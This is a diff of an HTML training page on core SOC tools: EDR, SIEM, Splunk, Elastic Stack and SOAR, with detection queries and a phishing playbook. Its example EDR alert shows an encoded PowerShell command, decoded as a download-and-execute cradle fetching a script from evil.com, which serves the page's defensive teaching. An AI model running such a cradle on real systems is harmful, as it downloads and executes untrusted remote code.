@@ -1,24 +1,76 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
 <h6 class="text-success mb-3"><i class="bi bi-book me-2"></i>Module 3: Core SOC Solutions</h6>
 
-<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
-<ul style="color:#c0d0e0;">
-  <li><b>Introduction to EDR</b> — Endpoint Detection & Response: agents that monitor endpoints for malicious activity, isolate hosts, and provide forensic data.</li>
-  <li><b>Introduction to SIEM</b> — Security Information & Event Management: log aggregation, correlation, alerting, and compliance reporting.</li>
-  <li><b>Splunk: The Basics</b> — Search Processing Language (SPL), indexers, forwarders, dashboards, and alert creation.</li>
-  <li><b>Elastic Stack: The Basics</b> — Elasticsearch, Logstash, Kibana (ELK): data ingestion, visualization, and detection rules.</li>
-  <li><b>Introduction to SOAR</b> — Security Orchestration, Automation, and Response: playbook automation, case management, and threat intel integration.</li>
-</ul>
+<p style="color:#c0d0e0;">This module covers the three core technologies every SOC analyst must know: EDR (Endpoint Detection & Response), SIEM (Security Information & Event Management), and SOAR (Security Orchestration, Automation & Response).</p>
 
+<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Introduction to EDR</p>
+<p style="color:#c0d0e0;">EDR agents sit on endpoints (laptops, servers, workstations) and continuously monitor for suspicious activity. When threats are detected, the EDR can isolate the host, kill processes, and provide forensic data.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> An EDR agent detects a suspicious process (powershell.exe -enc ...) running on an endpoint. The alert is sent to the SIEM, which correlates it with other telemetry. The SIEM triggers a correlation rule: "Suspicious PowerShell + outbound connection to unknown IP". A SOAR playbook automatically enriches the IP via VirusTotal, checks if the endpoint is critical, and opens a ticket in the case management system.
+<b>EDR Capabilities:</b><br>
+- Process monitoring: Every running process, parent-child relationships<br>
+- File monitoring: File creations, modifications, deletions<br>
+- Registry monitoring: New run keys, service installations<br>
+- Network monitoring: Outbound connections, port usage<br>
+- Memory scanning: Detect injected code, process hollowing<br>
+- Response actions: Isolate host, kill process, block hash, collect forensics<br><br>
+<b>Example EDR Alert:</b> "Powershell.exe launched from Microsoft Word with encoded command"<br>
+EDR shows: Parent=WINWORD.EXE, Child=powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA=='<br>
+Decoded: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')<br>
+<b>Response:</b> Isolate host → Kill process → Block file hash → Collect full forensic package
 </div>
 
-<h6 class="text-success mt-3">Key Skills Learned</h6>
-<ul style="color:#c0d0e0;">
-  <li>Understanding EDR, SIEM, and SOAR capabilities</li>
-  <li>Basic SPL queries in Splunk</li>
-  <li>Elasticsearch/Kibana fundamentals</li>
-  <li>SOAR playbook automation concepts</li>
-</ul>
+<p style="color:#00d4ff;font-weight:600;">🔹 Introduction to SIEM</p>
+<p style="color:#c0d0e0;">A SIEM aggregates logs from across the organization (firewalls, servers, endpoints, cloud) and provides analysis, correlation, alerting, and dashboards.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>SIEM Data Flow:</b><br>
+Data Sources (Windows, Linux, Firewall, EDR, Cloud) → Log Forwarders (Universal Forwarder, Beats) → SIEM Engine (Indexing, Parsing, Normalization) → Correlation Rules → Alerts → Dashboards → Analysts<br><br>
+<b>Example SIEM Correlation Rule:</b> "Brute Force Detection"<br>
+<code>Rule: When (EventID=4625 AND logon_type=3 AND count > 10 within 5 minutes) from same Source_IP<br>
+Result: Alert with severity=HIGH, assign to L1 SOC queue</code><br>
+When this rule triggers, the SIEM creates an alert with context: the source IP, target username, number of attempts, and time window.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Splunk: The Basics</p>
+<p style="color:#c0d0e0;">Splunk is the most widely used SIEM in enterprise SOCs. Its query language is SPL (Search Processing Language).</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Common SPL Commands:</b><br>
+<code>index=windows EventID=4625 | stats count by Account_Name, Source_IP | sort -count</code><br>
+→ Counts failed logins grouped by username and source IP, sorted by most attempts<br><br>
+<code>index=network src_ip=10.0.1.50 | timechart count by dest_ip</code><br>
+→ Shows outbound connections over time from a specific host<br><br>
+<code>index=proxy url="*.exe" | stats count by url, user | where count > 5</code><br>
+→ Finds users downloading executables via proxy, filter for download-heavy users<br><br>
+<code>index=windows EventID=4688 | search ParentImage=*WINWORD* AND Image=*powershell*</code><br>
+→ Detects Microsoft Office spawning PowerShell (classic phishing indicator)
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Elastic Stack: The Basics</p>
+<p style="color:#c0d0e0;">The Elastic Stack (ELK: Elasticsearch, Logstash, Kibana) is a free and open-source alternative to Splunk. Elasticsearch stores and indexes logs, Logstash ingests and transforms data, and Kibana provides visualization and dashboards.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Elastic Stack Example:</b><br>
+<b>Kibana Query (EQL):</b><br>
+<code>process where event.code == "1" and process.parent.name == "WINWORD.EXE" and process.name == "powershell.exe"</code><br>
+→ Same detection as the Splunk query — Office spawning PowerShell<br><br>
+<b>Detection Rule (Elastic Security):</b><br>
+<code>sequence by host.ip<br>
+[process where event.code == "1" and process.name == "powershell.exe"]<br>
+[network where process.name == "powershell.exe" and destination.port == 443]</code><br>
+→ Detects PowerShell that also makes a network connection (potential C2)
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Introduction to SOAR</p>
+<p style="color:#c0d0e0;">SOAR automates repetitive SOC tasks. When a SIEM alert fires, SOAR can automatically enrich the alert with threat intel, create a ticket, and even take containment actions.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>SOAR Playbook Example — "Phishing Response":</b><br>
+1. Trigger: User reports phishing email via Outlook plugin<br>
+2. SOAR extracts: Sender, Subject, Links, Attachments, Headers<br>
+3. Automation: Submit URLs to URLScan.io, submit attachments to sandbox, check sender reputation on VirusTotal<br>
+4. Enrichment: Add reputation scores, geo-location, domain age to incident<br>
+5. Decision: If malicious (score > 5/10) → block at email gateway, block URLs at proxy, delete from all inboxes<br>
+6. Notification: Notify SOC team, send phishing alert to all employees<br>
+7. Ticketing: Create incident ticket with all evidence attached<br>
+Total time saved: ~30 minutes per incident → 3+ hours per day
+</div>
 </div>
